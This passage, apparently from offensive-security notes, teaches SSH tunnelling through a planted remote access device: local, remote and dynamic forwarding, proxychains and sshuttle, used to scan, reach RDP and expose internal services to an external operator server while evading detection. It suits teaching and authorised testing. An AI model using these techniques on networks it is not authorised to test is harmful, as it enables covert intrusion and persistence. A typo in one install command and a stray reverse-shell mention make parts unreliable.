it is essential to start and enable the Secure Shell (SSH) service. This is a primary, low bandwidth method of connecting to the device. Additionally, through an SSH connection we are then able execute offensive operations as well as add/remove remote access services or modify existing services. Most RADs are comprised of some sort of low compute device with a Linux operating system such as a raspberry pi running Debian. SSH is not started by default, so we first need to start the service then we need to enable it to ensure that the service starts every time that the RAD is powered on which ensures we have at least one way to connect to the RAD from our local machine.

- Starting the service and making it run at boot
```bash
sudo systemctl start ssh
```
```bash
sudo systemctl enable ssh
```
After we have enabled the service, we should check to make sure that the service is “Active” and “Enabled.” This means that the service is currently running and will be started by default anytime the device is turned on.
- Checking the status of the service
```bash
sudo systemctl status ssh
```
# SSH Tunneling & Port Forwarding
Now that we have Command Line Interface (CLI) access through SSH there are a plethora of ways to act on the target network through the RAD. However, it should be noted that most RADs are small lower bandwidth & computing environments that are limited in the number of calculations they can perform compared to our local machine. Meaning, running resource-intensive tools such as nmap, Metasploit, or hashcat are just not feasible on the RAD. This effectively limits what we can do with our RAD on the target network. Therefore, if we simply run kali Linux on a Raspberry Pi or install offensive tools on a RAD hoping to effectively compromise the target network we are mistaken. The primary purpose of a RAD is to provide remote access to the target network NOT to attack the network with the RAD.

Additionally, as we pivot through the target network there is potential for lots of network constraints that limit the type of traffic that can be transmitted on the network and where that traffic can go. Moreover, with modern Intrusion Detection Systems (IDS), Intrusion Protection Systems (IPS) and Endpoint Detection and Response (EDR) toolsets, we could be easily detected using offensive tools over/in the target network. So how do we mitigate this risk? Tunneling.

Tunneling is a technique used to encapsulate network traffic within another protocol to bypass firewalls, obscure communication or securely transmit data over an untrusted network. It enables attackers to covertly move traffic across restricted environments while maintaining control over compromised systems.

SSH tunneling is a type of encrypted tunneling where network traffic is routed through an SSH connection. What we are really doing when we are using SSH tunneling in conjunction with our RAD is turning our RAD into a relay that simply passes our traffic (from our local machine) to the target network and returns the responses from the target back to our local machine. By using our RAD to tunnel traffic we can maximize its compute capacity during the operation, capitalize on the high compute resources of our local attacking machine, and decrease interruptions from low-bandwidth connections while maintaining a covert position away from the target network. This allows attackers to securely forward ports, access internal resources, and proxy traffic through a RAD or compromised host and consists of 3 types:
1. Local Port Forwarding
2. Remote Port Forwarding
3. Dynamic Port Forwarding
## Local Port Forwarding
Local port forwarding allows an attacker to access a remote service that is otherwise unreachable by forwarding traffic from a local machine through an SSH tunnel to a target machine behind a firewall or on another network. Essentially, this makes a remote service accessible on your local machine.
### How It Works:
- The attacker establishes an SSH tunnel to the RAD.
- The RAD forwards the attacker’s traffic to a target system inside the network.
- The attacker can now access the target service as if it were running on his local machine.
### Diagram
![[Pasted image 20250318112200.png]]
### Pros & Cons
#### Pros
- Easy to set up and use.
- Minimal footprint so no need to install offensive tools on the RAD
- Ideal for accessing internal services stealthily.
#### Cons
- Only forwards one service per port, requiring multiple tunnels for multiple services.
### Command
```bash
ssh -L [local_port]:[target_IP]:[target_port] username@RAD_IP
```
### Example
Operator needs to access an internal web server on the target network. The target web server is running on 10.0.0.5:80. The operator needs to access the web service without running tools directly on the RAD.
#### Solution (local port forward)
- Command
```bash
ssh -L 8080:10.0.0.5:80 user@RAD_IP
```
- Now by navigating in a browser to http://localhost:8080 the operator can gain access to the internal web server through a browser on his local machine
## Remote Port Forwarding
Remote port forwarding allows an attacker-controlled machine to receive connections from a remote target, effectively exposing internal services to the outside. This technique is crucial for persistence, covert communication and accessing target network services from anywhere. Unlike local port forwarding which lets the attacker access internal services through the RAD, remote port forwarding allows external machines to access services running on the RAD or inside the target network.
### How It Works:
- The attacker sets up an SSH connection from the RAD to an external system (or local machine)
- A port on the external system is mapped to a service inside the target network.
- Once the tunnel is active, any system with access to the external server can connect to the forwarded service as if it were running directly on the external server.
### Diagram
![[Pasted image 20250318112443.png]]
### Pros & Cons
#### Pros
- Allows for bypassing of restrictive firewalls that prevent direct inbound connections.
- Maintains persistent access even if the RAD changes networks.
- Exposes multiple internal services to the attacker’s machine.
- Works well in NAT-restricted environments where direct inbound connections would fail.
#### Cons
- Requires a reachable external system that grants access to other systems to establish the tunnel.
- May trigger security alerts if an internal service suddenly becomes externally accessible.
- Exposed services can be discovered by others unless additional security is applied.
- Latency and performance limitations (especially when tunneling high-bandwidth services like RDP and VNC)
### Example
Operator needs to access a target windows server (10.0.0.20) running RDP (3389) but it is not exposed to the internet. This means the attacker needs RDP from the outside to the device without needing a direct inbound connection. While we could run a local port forward to be able to access the target machine through the rad via RDP, that access would only be through our local machine. With that said, if we have a team or other operators that need/want access to the target machine through RDP we would be better served granting them access to our local machine or an external server where we could expose the target machine to.
#### Solution (remote port forward)
- Command
```bash
ssh -R 4444:10.0.0.20:3389 user@OPERATOR_OR_SERVER_IP
```
- From the RAD we have now forwarded RDP to the target system to the operator or server’s ip. Now anyone who wants to connect to RDP into the target would simply need to establish the connection with the server on port 4444.
- On a Linux machine the command would look like:
```bash
xfreerdp3 /u:USERNAME /p:PASSWORD /v:SERVER_OR_OPERATOR_IP:4444
```
## Dynamic Port Forwarding
Dynamic port forwarding allows and SSH client to create a SOCKS proxy which enables flexible and dynamic routing of traffic thorough an SSH tunnel. A Socket Secure (SOCKS) proxy is a network protocol that routes traffic between a client and a server through an intermediary proxy server. Unlike HTTP proxies that only work with web traffic, SOCKS proxies operate at a lower level (Layer 5 of the OSI model) meaning they can handle any type of traffic including things like web browsing, SSH, FTP, DNS and RDP. Unlike local or remote port forwarding, which map specific ports, dynamic forwarding does not bind to a single target—instead, it allows any application or service to route traffic through the tunnel, making it highly versatile for offensive cyber operations.

This is particularly useful for hiding attacker traffic, pivoting through a compromised host, bypassing network restrictions, and anonymizing connections.
### How A SOCKS Proxy Works
- The attacker sets up a SOCKS proxy server on the RAD (via an ssh tunnel using ssh -D)
- The attacker machine is configured to send traffic through the proxy.
- The proxy server received but does not interpret the traffic but simply forwards it to the target destination.
- It acts as an intermediary making it seem like the traffic originates from the proxy instead of the attacker’s local machine.
### Diagram
![[Pasted image 20250318112739.png]]
### Pros & Cons
#### Pros
- Highly flexible and can dynamically forward any traffic without pre-configured ports.
- Hides the operators real IP as the traffic appears to originate from the RAD to the target.
- Bypasses firewalls and network restrictions which is effective in proxy-aware environments.
- Ideal for pivoting inside a network because it allows you the flexibility to explore and attack internal systems through the Rad
- Works without proxy-aware tools and supports nmap, curl, browsers, Metasploit and C2 frameworks.
#### Cons
- Slower than direct connections as it adds latency especially for high-bandwidth activities like RDP.
- Some applications may not support SOCKS proxies because it requires additional tools like “proxychains”
- There is a detection risk with unusual SSH tunnels or SOCKS proxies might trigger network security monitoring alerts.
- It’s not a full VPN replacement, only traffic routed through the proxy is affected; other network activity remains exposed.
### Commands
- Install proxychains
```bash
sudo apt update && sudo apt install -y proxychains
```
- Start the dynamic SSH tunnel
```bash
ssh -D 1080 -N -f user@RAD_IP
```
- Add/edit the following line at the end of the file
```bash
sudo vim /etc/proxychains.conf
```
```ini
[ProxyList]
socks5 127.0.0.1 1080
```
- Use the proxy preceding your command with "proxychains" in the terminal to route traffic through the proxy
```bash
proxychains <COMMAND>
```
### Example
An operator needs to conduct reconnaissance on a target network. There is a RAD in place that is connected to the target network. The IP of the RAD on the target network is 10.0.0.5. First the operator sets up the proxy on the RAD and connects it to his local machine using the steps above. Then he attacks each of the servers and can get a reverse shell and an RTSP feed on the Swann DVR.
#### Solution (Dynamic Port Forward)
Using the proxy on the RAD the operator can scan the /24 network to gather intelligence on the target network for follow-on offensive operations by preceding his nmap command with proxychains.
- Command
```bash
proxychains nmap -sT -Pn 10.0.0.0/24
```
- Now the output of this command will give more insight into open ports, services, and hosts on the target network for further exploitation.
## sshuttle
The easiest and one of the most effective ways to tunnel traffic through a RAD to a target network is to use “sshuttle” (only for Linux). SShuttle is a hybrid VPN and proxy tool that allows users to route all or selected network traffic through an SSH connection. Unlike a standard SSH tunnel, sshuttle enables transparent proxying by dynamically intercepting and forwarding traffic, making it functionally like a VPN but without requiring root access on the remote machine.

Sshuttle is often described as a “poor man’s VPN” because it allows full network access without setting up a complex VPN configuration like you would have to with WireGuard or OpenVPN. Instead, it relies on SSH and automatically routes traffic through the SSH server.
### How it works:
- Sshuttle sets up a local firewall rule (via iptables or pf on macOS/Linux).
    - This redirects network traffic to sshuttle instead of sending it directly to the destination.
- Sshuttle then intercepts and forwards packets to the remote SSH server.
    - It does this by establishing a connection to a remote server or RAD.
    - RAD then forwards packets to the destination as if it were the attacker’s local machine inside of the target network.
- Sshuttle creates a transparent proxy.
    - Unlike a SOCKS proxy there is no application configuration needed because all traffic is automatically routed.
    - This works even for applications that do not support proxy settings, making it ideal for stealthy network access.
### Diagram
![[Pasted image 20250318113402.png]]
### Pros & Cons
#### Pros
- Transparent routing: No need to configure individual applications because all traffic is forwarded automatically.
- Full network access: Unlike SOCKS proxies, it allows direct access to remote internal systems.
- No root access needed on the RAD: Unlike full VPN solutions, sshuttle does not require root access on the RAD only SSH access.
- Minimal footprint: Leaves fewer traces on the RAD, reducing forensic evidence of attacker activity.
- Bypasses firewalls and network restrictions: Since it only uses SSH, it works in environments where VPNs or other tunnels may be blocked
- Easy to deploy: A single command sets it up, without a complex VPN configuration.
#### Cons
- Only works with Linux/macOS (No native Windows support but works in wsl and wsl2): Requires a Linux-based attack machine.
- No UDP support: Can’t tunnel UDP traffic (e.g. VOIP, some gaming protocols).
- May trigger suspicion in network logs: While it’s stealthier than some methods a high volume of SSH traffic to the RAD or compromised machine may raise alerts.
- Only works over SSH: Unlike full VPNs, sshuttle only works with SSH-accessible devices.
### Installation
- Command
```bash
sudo apt update && sudo apt install -y sshuttls
```
### Example
An attacker has the credentials for users on a target network but does not know what hosts are serving RDP for remote login. There is a RAD deployed on the target network (192.168.1.40) running and SSH server.
#### Solution (sshuttle)
Use sshuttle to redirect all traffic from the local machine through the RAD via sshuttle to the target network.
#### Commands
- Setup sshuttle to route all traffic from the local machine to the 192.168.1.0/24 network through the RAD via sshuttle
```bash
sshuttle -r USER@RAD_IP 192.168.1.0/24
```
- This will lock up the terminal but start the session and the tunnel/proxy
- In another terminal scan the network for hosts running RDP
```bash
sudo nmap -A -T5 -sC -sV -O -A -p- -oN scan.nmap 192.168.1.0/24
```
- The output of this command will show hosts with open/vulnerable ports and services and output the results to a file in the current directory called scan.nmap
- Using the information gathered from the nmap scan we can now RDP into the host we identified at 192.168.1.11 which is a windows server running RDP.
```bash
xfreerdp3 /u:USERNAME /p:PASSWORD /v:TARGET_IP
```
- After we have concluded operations or no longer need the tunnel through the RAD we can close the terminal where we ran the sshuttle command
#### Note
it is possible to chain sshuttle connections through compromised hosts as long as they are running an SSH server you have access to and the machine that you will be calling the sshuttle command from has sshuttle installed.
## Conclusion
While there are a variety of ways to gain access to a target machine through a RAD, tunneling tends to be the most effective. Tunneling through a RAD to access a target network is a critical and highly effective tactic in offensive cyber operations. By using a RAD as an intermediary, operators can maintain persistent access, minimize forensic traces and execute attacks from within the target environment without exposing their actual attack infrastructure. This method is particularly useful when external access is restricted, as it allows attackers to bypass firewalls, NAT, and network segmentation by making their traffic appear as if it originates from inside the network. Additionally, tunneling through a RAD enables covert communication channels making detection and response by defenders significantly more difficult.

Additionally, sshuttle is a powerful network pivoting tool for offensive cyber operations when access is limited to SSH-only environments. By turning a RAD into a transparent network proxy, it allows attackers to access internal networks without executing commands on the RAD itself. This reduces forensic footprints and allows for stealthy lateral movement. While it has limitations, sshuttle’s ease of use, stealth and flexibility make it one of the best tunneling tools for low-footprint offensive operations.

Since most RADs are low-power, low-bandwidth devices, they are not ideal for directly executing resource-intensive attacks, but on the other hand, they do excel at relaying traffic, pivoting to new targets, and exfiltrating data while keeping the main attack system safely offsite. By leveraging tunneling techniques operators can extend their attack surface, evade detection, and establish stealthy, resilient access to compromised networks.